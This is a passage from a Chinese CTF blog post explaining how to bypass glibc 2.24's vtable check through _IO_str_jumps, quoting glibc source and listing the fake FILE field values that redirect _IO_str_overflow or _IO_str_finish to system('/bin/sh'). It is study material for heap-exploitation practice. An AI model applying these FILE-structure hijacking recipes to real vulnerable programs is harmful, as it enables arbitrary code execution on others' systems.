+<p>#libc2.24中的利用方式<br>在libc2.24中加入对vtable虚表指针的检查，函数IO_validate_vtable会检查vtable指针是否在合法的地址上，即是否在__libc_IO_vtables段中，如果不在合法的段中，会调用_IO_vtable_check()进行下一步的检查。如果不能通过检查就会引发abort。这使得上面修改vtable虚表指针的利用方式不再可行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 ./libio/libioP.h</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> * <span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/vtables.c</span></span><br><span class="line"><span class="keyword">void</span> attribute_hidden _IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">"Fatal error: glibc detected an invalid stdio handle\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>虽然不能在__libc_IO_vtables段外伪造虚表指针，但是可以利用其他的不在检查范围内的虚表，正如很多大佬的博客中写的那样，利用_IO_str_jumps。</p>
+<p>##_IO_str_overflow<br>我这里调试的是CTF-WIKI中修改后的house of orange，首先是利用_IO_str_jumps-&gt;_IO_str_overflow。<br>首先看一下_IO_str_jumps的结构。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.24 /libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT(NAME, VALUE) VALUE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)</span></span><br></pre></td></tr></table></figure></p>
+<p>在函数_IO_str_overflow可以伪造劫持控制流：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">int</span> _IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">//pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span>  <span class="comment">//pass</span></span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *new_buf;</span><br><span class="line">    <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">    _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;  <span class="comment">//这里写上"/bin/sh"</span></span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; old_blen) <span class="comment">//pass</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    new_buf = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); <span class="comment">//这里写上system的地址</span></span><br><span class="line">    <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/*    __ferror(fp) = 1; */</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (old_buf)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">        (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">        <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">        fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">    _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">    fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">    fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">    fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">    fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">    fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>涉及到的结构及变量有：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 ./libio/strfile.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.24 ./libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure></p>
+<p>需要满足的条件有：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_flags &amp; _IO_NO_WRITES为假</span><br><span class="line"><span class="number">2.</span>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only为真，即(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base + flush_only</span><br><span class="line"><span class="number">3.f</span>p-&gt;_flags &amp; _IO_USER_BUF为假</span><br><span class="line"><span class="number">4.</span>_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span> 指向<span class="string">"/bin/sh"</span></span><br><span class="line"><span class="number">5.</span>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)指向system的地址</span><br></pre></td></tr></table></figure></p>
+<p>对于第一个条件，可以设置如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<p>对于第二个条件，由于flush_only = EOF = 0，转化为pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base，_IO_blen (fp) = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base，<br>联系第四个条件，new_size指向bin_sh_addr，而new_size有如下等式：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span> = <span class="number">2</span> * _IO_blen (fp) + <span class="number">100</span> = <span class="number">2</span> * (fp-&gt;\_IO\_buf\_end - fp-&gt;\_IO\_buf\_base) + <span class="number">100</span> = bin_sh_addr</span><br></pre></td></tr></table></figure></p>
+<p>因此，可以构造：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;\_IO\_buf\_base = <span class="number">0</span></span><br><span class="line">fp-&gt;\_IO\_buf\_end = (bin_sh_addr - <span class="number">100</span>)/<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
+<p>为了比较中的大于等于关系成立，可以尽心如下构造：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">#关于fp-&gt;_IO_write_ptr在其他博客里我看到过如下构造</span><br><span class="line">fp-&gt;_IO_write_ptr = (bin_sh_addr - <span class="number">100</span>)/<span class="number">2</span> 或 fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span> 或根本不设置该值</span><br></pre></td></tr></table></figure></p>
+<p>对于第三个条件与第一个条件构造相同。<br>第四个条件在构造第二个条件时已经满足。<br>对于第五个条件，fp-&gt;_s._allocate_buffer要设置为system的地址，_s._allocate_buffer在fp中的偏移是0xe0，因此要设置：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp+<span class="number">0xe0</span> = system_addr</span><br></pre></td></tr></table></figure></p>
+<p>最后我看到有博客里还设置了mode的值，我也没明白是为什么。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;mode = <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<p>那程序如何调用_IO_str_overflow呢？同样在调用_IO_flush_all_lockp时调用_IO_OVERFLOW，在_IO_OVERFLOW中调用_IO_str_overflow。不知道这个地方怎么写….<br>总结构造的条件是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span> </span><br><span class="line">fp-&gt;\_IO\_buf\_base = <span class="number">0</span></span><br><span class="line">fp-&gt;\_IO\_buf\_end = (bin_sh_addr - <span class="number">100</span>)/<span class="number">2</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (bin_sh_addr - <span class="number">100</span>)/<span class="number">2</span> 或 fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span> 或根本不设置该值</span><br><span class="line">fp+<span class="number">0xe0</span> = system_addr</span><br><span class="line">fp-&gt;mode = <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<p>##_IO_str_finish<br>在_IO_str_jumps libio_vtable中第二项是_IO_str_finish中同样有相对地址的引用，而且相对比较简单。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>需要满足的条件有:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_buf_base为真，(fp-&gt;_flags &amp; _IO_USER_BUF)为假</span><br><span class="line">fp-&gt;_IO_buf_base为bin_sh_addr</span><br><span class="line">fp-&gt;_s._free_buffer为system函数地址</span><br></pre></td></tr></table></figure></p>
+<p>可以构造以下条件以通过检查：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_buf_base = bin_sh_addr</span><br><span class="line">fp-&gt;_s._free_buffer = system_addr</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange/</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/</a><br><a href="http://tacxingxing.com/2018/01/10/house-of-orange/" target="_blank" rel="noopener">http://tacxingxing.com/2018/01/10/house-of-orange/</a><br><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn利用总结/" rel="tag"># pwn利用总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/03/0ctf2019-zerotask/" rel="next" title="0ctf2019 zerotask">
+                <i class="fa fa-chevron-left"></i> 0ctf2019 zerotask
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/05/Chunk-overlapping利用总结/" rel="prev" title="Chunk overlapping利用总结">
+                Chunk overlapping利用总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-2016-house-of-orange"><span class="nav-number">1.</span> <span class="nav-text">HITCON 2016 house of orange</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap-house-of-orange"><span class="nav-number">2.</span> <span class="nav-text">how2heap house of orange</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目概述"><span class="nav-number">2.1.</span> <span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程分析"><span class="nav-number">2.2.</span> <span class="nav-text">利用过程分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
